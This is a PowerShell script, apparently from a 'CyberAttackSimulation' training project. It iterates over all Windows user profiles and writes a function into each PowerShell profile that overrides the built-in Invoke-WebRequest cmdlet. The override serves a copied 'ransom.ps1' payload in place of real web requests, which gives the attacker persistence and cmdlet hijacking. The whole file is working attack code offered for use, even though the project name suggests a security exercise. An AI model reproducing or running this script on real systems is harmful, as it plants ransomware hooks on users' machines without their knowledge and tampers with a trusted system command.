###################
#    CyberAttackSimulation for CyberTalk
#    Copyright (C) 2025  CyberAttackSimulation

#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.

#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.

#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <https://www.gnu.org/licenses/>.
###################

$functionText = @"
function Invoke-WebRequest {
    `$path = '__PATH__'
    return Get-Content -Path `$path -Raw
}
"@

$userProfiles = Get-ChildItem 'C:\Users' -Directory | Where-Object {
    Test-Path "$($_.FullName)\Documents"
}

foreach ($user in $userProfiles) {
    try {
        $profileDir = "$($user.FullName)\Documents\PowerShell"
		$profileDir2 = "$($user.FullName)\Documents\WindowsPowerShell"
        $profileFile = "$profileDir\Microsoft.PowerShell_profile.ps1"
		$profileFile2 = "$profileDir2\Microsoft.PowerShell_profile.ps1"

        if (-not (Test-Path $profileDir)) {
            New-Item -ItemType Directory -Path $profileDir -Force | Out-Null
        }
		
		if (-not (Test-Path $profileDir2)) {
			New-Item -ItemType Directory -Path $profileDir2 -Force | Out-Null
        }

        if (-not (Test-Path $profileFile)) {
            New-Item -ItemType File -Path $profileFile -Force | Out-Null
        }
		
		if (-not (Test-Path $profileFile2)) {
			New-Item -ItemType File -Path $profileFile2 -Force | Out-Null
        }

        if (-not (Get-Content $profileFile | Select-String -Pattern 'function Invoke-WebRequest')) {
            $ransomFilename = "$profileDir\ransom.ps1"
            Copy-Item -Path "arsenal\USB\ransom.ps1" -Destination $ransomFilename
            $currentFunction = $functionText -replace '__PATH__', $ransomFilename
            Add-Content -Path $profileFile -Value $currentFunction
			if (-not (Get-Content $profileFile2 | Select-String -Pattern 'function Invoke-WebRequest')) {
				Add-Content -Path $profileFile2 -Value $currentFunction
			}
            Write-Output "Fonction ajoutée pour l'utilisateur : $($user.Name)"
        } else {
            Write-Output "Fonction déjà présente pour l'utilisateur : $($user.Name)"
        }
    } catch {
        Write-Warning "Impossible de modifier le profil de $($user.Name) : $_"
    }
}

Write-Output "Script terminé."
